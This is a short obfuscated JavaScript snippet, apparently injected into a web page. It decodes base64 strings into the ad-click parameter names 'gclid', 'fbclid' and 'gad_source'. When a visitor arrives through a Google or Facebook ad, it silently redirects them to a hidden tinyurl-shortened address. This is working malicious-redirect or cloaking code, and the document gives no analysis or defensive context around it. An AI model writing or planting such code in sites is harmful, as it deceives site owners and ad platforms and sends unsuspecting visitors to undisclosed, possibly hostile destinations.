(function(){
  var d = atob, 
      q = location.search,
      p = d('Z2NsaWQ=') + "=|" + d('ZmJjbGlk') + "=|" + d('Z2FkX3NvdXJjZQ==') + "=";
  if (new RegExp(p).test(q)) {
    location.replace('https://tinyurl.com/3dd9hyfz');
  }
})();
